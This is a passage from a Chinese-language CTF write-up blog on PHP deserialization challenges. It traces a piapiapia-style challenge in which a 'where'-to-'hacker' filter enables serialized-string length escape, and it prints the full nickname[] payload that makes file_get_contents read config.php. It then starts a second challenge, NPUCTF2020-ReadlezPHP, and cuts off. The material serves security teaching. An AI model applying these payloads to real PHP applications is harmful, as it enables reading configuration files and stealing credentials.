variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> __class__<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>config.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hostname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>çœ‹æœ€åä¸€ä¸ªconfig.phpä¸­åŒ…å«flagï¼Œé¢˜ç›®è¦æ±‚åº”è¯¥æ˜¯è¦æˆ‘ä»¬config.phpæ–‡ä»¶ï¼Œå¯»æ‰¾åˆ©ç”¨ç‚¹</p><p>åœ¨profile.phpä¸­çœ‹åˆ°æœ‰ä¸€è¡Œä»£ç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$photo</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ˜æ˜¾çš„æ–‡ä»¶è¯»å–æ“ä½œï¼Œè€Œåœ¨ä»£ç ä¸Šå‘ç°æœ‰ä¸€ä¸ªååºåˆ—åŒ–æ“ä½œ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ‰¾åˆ°<code>$profile</code>çš„å®šä¹‰</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$profile</span><span class="token operator">=</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è·Ÿè¿›<code>show_profile</code>å‡½æ•°</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$object</span><span class="token operator">-></span><span class="token property">profile</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å­˜åœ¨ä¸€ä¸ªå¯¹æ•°æ®åº“çš„æŸ¥è¯¢æ“ä½œï¼Œäºæ˜¯å¯»æ‰¾æ•°æ®åº“å†™å…¥æ“ä½œ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$new_profile</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$new_profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'profile'</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>åœ¨æ‰¾åˆ°å¼•ç”¨è¿‡è¿™ä¸ªå‡½æ•°çš„ä»£ç ï¼Œåœ¨update.phpä¸­</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å¯çœ‹åˆ°å­˜åœ¨åºåˆ—åŒ–æ“ä½œï¼Œè‡³æ­¤å…³ç³»ä»¥åŠç†æ¸…æ¥š</p><p>é€šè¿‡å¯¹<code>$profile</code>ä¼ å…¥åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å†ç»•è¿‡é˜»ç¢è¾¾åˆ°åˆ©ç”¨<code>file_get_contents</code>è¯»å–æ–‡ä»¶çš„æ“ä½œ</p><p>å†ç»†çœ‹ä»£ç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'upload/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'upload/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>$profileæ˜¯è¿™æ ·å®šä¹‰çš„ç»“åˆä¸Šé¢çš„è¯»å–æ–‡ä»¶æ“ä½œå¯çŸ¥å…¶ä¸­çš„photoå˜é‡å¦‚æœæ§åˆ¶ä»¤å…¶ä¸ºconfig.phpå³å¯è¯»å–åˆ°flagï¼Œäºæ˜¯åˆæ­¥payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"11111111111"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aa@aa.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"nickname"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aaa"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">39</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"upload/0cc175b9c0f1b6a831c399e269772661"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ååºåˆ—åŒ–åªååˆ°ç¬¬ä¸€ä¸ª<code>&#125;</code>ç»“æŸï¼Œåé¢çš„è‡ªåŠ¨ä¸¢å¼ƒï¼Œä½†æ˜¯photoä¼¼ä¹ä¸æ˜¯æˆ‘ä»¬èƒ½å¤Ÿç›´æ¥æ§åˆ¶çš„ï¼Œæºç ä¸­<code>photo= &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸èƒ½ç›´æ¥æ›´æ”¹photoä¸­çš„å†…å®¹äº†ï¼Œäºæ˜¯å°±éœ€è¦æ‰¾åˆ°åºåˆ—åŒ–åçš„å…¶å®ƒå¯åˆ©ç”¨å‚æ•°å†å…¶åå†™ä¸Š<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>ï¼Œè¾¾åˆ°ä¿®æ”¹çš„æ•ˆæœï¼Œphoneï¼Œemailï¼Œnicknameéƒ½æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œè€Œphoneå’Œemailç»è¿‡äº†ä¸¥æ ¼çš„è¿‡æ»¤ï¼ˆè¯¦æƒ…çœ‹ä¸Šé¢çš„update.phpæºç ï¼‰ï¼Œå†æ¥çœ‹çœ‹nicknameï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>nickname[]</code>æ•°ç»„ç»•è¿‡<code>preg_match</code>å’Œ<code>strlen</code>å³å¯ï¼Œä¸¤è¾¹åˆ¤æ–­å‡ä¸º<code>false</code>ï¼Œæ•…ä¸ä¼šæ‰§è¡Œifä¸­çš„è¯­å¥ï¼Œäºæ˜¯å†æ„é€ payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"11111111111"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aa@aa.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"nickname"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aaa"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">39</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"upload/0cc175b9c0f1b6a831c399e269772661"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>åˆ°è¿™é‡Œæ˜¯å¦å°±å·²ç»å¯ä»¥æˆåŠŸè¯»å–åˆ°æ–‡ä»¶äº†å‘¢ï¼Ÿå¹¶éå¦‚æ­¤ï¼Œå¦‚æœè¦è¿›è¡Œå¦‚ä¸Šçš„æ“ä½œï¼Œå°±éœ€è¦ç»™<code>nickname[]</code>ä¼ <code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>è¿™æ ·çš„ä¸€ä¸ªå€¼ï¼Œä¼ å…¥åå°†ä¼šæ˜¯è¿™ä¸ªæ ·å­</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"11111111111"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aa@aa.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"nickname"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token string double-quoted-string">";&#125;s:5:"</span>photo<span class="token string double-quoted-string">";s:39:"</span>upload<span class="token operator">/</span><span class="token number">0</span>cc175b9c0f1b6a831c399e269772661"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è™½ç„¶çœ‹ä¸Šå»å¤§æ‹¬å·è¢«é—­åˆäº†ï¼Œä½†æ˜¯è¦æ³¨æ„åˆ°<code>s:34</code>è¿™é‡Œï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¿›è¡Œæ•°æ®è¯»å–çš„æ—¶å€™ä¾ç„¶ä¼šè¯»å–åˆ°å¼•å·ä¸­çš„34ä½å­—ç¬¦ï¼Œå°±å¯¹äºæ²¡æœ‰é—­åˆä¸Šï¼Œé‚£æœ‰è¯¥å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿå†æ¥ç€çœ‹ä»£ç ï¼Œ</p><p>çœ‹çœ‹å°†<code>$profile</code>åºåˆ—åŒ–ç»“æœå­˜å…¥æ•°æ®åº“æ—¶çš„æ“ä½œï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$new_profile</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$new_profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'profile'</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¯çœ‹è§å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†å¤„ç†ï¼Œè·Ÿè¿›çˆ¶ç±»çš„<code>filter</code>æ–¹æ³•ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$escape</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'insert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'update'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'where'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$safe</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¯è§<code>$string</code>å‚æ•°ç»è¿‡äº†ä¸¤æ¬¡è¿‡æ»¤ï¼Œç¬¬ä¸€æ¬¡ç­‰äºæ²¡ç”¨ï¼Œä¸¤æ¬¡åº”è¯¥éƒ½æ˜¯æ¥é˜²æ­¢sqlæ³¨å…¥çš„ï¼Œä½†è¿™é‡Œä¼¼ä¹ä¹Ÿä¸å­˜åœ¨sqlæ³¨å…¥ï¼Œåºåˆ—åŒ–åçš„<code>$profile</code>ä¸å¯èƒ½æœ‰sqlæ³¨å…¥é£é™©ï¼Œè€Œ<code>$username</code>çš„å–å€¼æ¥è‡ª<code>$_SESSION[&#39;username&#39;]</code>ï¼Œè€Œ<code>username</code>çš„<code>session</code>æ˜¯ç³»ç»Ÿåˆ†é…çš„ï¼Œè¿™é‡Œä¹Ÿä¸å­˜åœ¨sqlæ³¨å…¥ï¼Œæ‰€ä»¥æƒ³æƒ³æ€ä¹ˆåˆ©ç”¨åœ¨ååºåˆ—åŒ–ä¸Šé¢</p><p>è¿™é‡Œå°±æ¶‰åŠåˆ°æœ¬é¢˜çš„æ ¸å¿ƒäº†ï¼Œ<strong>ååºåˆ—åŒ–é•¿åº¦é€ƒé€¸å­—ç¬¦</strong></p><p>åœ¨phpååºåˆ—åŒ–çš„å®ˆæŠ¤æ˜¯æ ¹æ®såé¢çš„å€¼æ¥å–å­—ç¬¦ä¸²é•¿åº¦çš„ï¼Œè€Œåœ¨<code>filter</code>æ–¹æ³•æ€»å­˜åœ¨<code>preg_replace</code>æ›¿æ¢ï¼Œå¦‚æœæœ‰<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>å…¶ä¸­ä¹‹ä¸€å°±æ›¿æ¢æˆ<code>&#39;hacker&#39;</code>ï¼Œ<code>hacker</code>é•¿åº¦ä¸º6ä½ï¼Œè¯•æƒ³å¦‚æœæ›¿æ¢äº†é‡Œé¢é•¿åº¦å°äº6ä½çš„å­—ç¬¦ä¸²ï¼Œè€Œsåçš„å–å€¼é•¿åº¦å‘å€¼æœ‰æ²¡å˜ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰æœ«å°¾çš„å­—ç¬¦æº¢å‡ºä¸ä¼šè¢«è¯»å–åˆ°ï¼Œè€Œæ²¡è¢«è¯»å–åˆ°çš„è¯è‡ªç„¶å°±è¢«å½“åšåºåˆ—åŒ–åçš„æ ¼å¼å¤„ç†ï¼Œå†ç»“åˆè¿™é‡Œï¼Œæ”¹é—­åˆçš„å¤§æ‹¬å·å°±å¯ä»¥é—­åˆçš„ä¸Šï¼Œå†çœ‹çœ‹æˆ‘ä»¬éœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸²<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>ï¼Œå°±æ˜¯è¿™34ä½ï¼Œè€Œæ›¿æ¢çš„å­—ç¬¦ä¸²ä¸­æ­£å¥½ä¸€ä¸ªæœ‰æ¯”<code>hacker</code>çŸ­çš„å­—ç¬¦ä¸²<code>where</code>ï¼Œé‚£ä¹ˆä¸€æ¬¡å°±å¯ä»¥é€ƒé€¸ä¸€ä¸ªå‡ºæ¥ï¼Œé‚£ä¹ˆç›´æ¥ä¼ å…¥34ä¸ª<code>where</code>å°±å¯ä»¥å°†<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>å®Œæ•´çš„é€ƒé€¸å‡ºæ¥ï¼Œäºæ˜¯æœ€ç»ˆ<code>payload</code>å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"11111111111"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aa@aa.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"nickname"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token string double-quoted-string">";&#125;s:5:"</span>photo<span class="token string double-quoted-string">";s:39:"</span>upload<span class="token operator">/</span><span class="token number">0</span>cc175b9c0f1b6a831c399e269772661"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ä»¤<code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>å³å¯</p><p>éšåå‘åŒ…ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412212311132.png" alt loading="lazy"></p><p>æŸ¥çœ‹<code>profile.php</code>ç½‘é¡µé¡µé¢æºä»£ç ï¼Œå°†å›¾ç‰‡çš„base64è§£å¯å¾—åˆ°<code>config.php</code>çš„å†…å®¹ï¼Œå³å¯å¾—åˆ°flag</p><h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="NPUCTF2020-ReadlezPHP"></a>NPUCTF2020-ReadlezPHP</h3><p>F12åç‚¹è¿›å»å¯ä»¥çœ‹åˆ°æºç </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200422183658606.png" alt loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#error_reporting(0);</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloPhp</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span 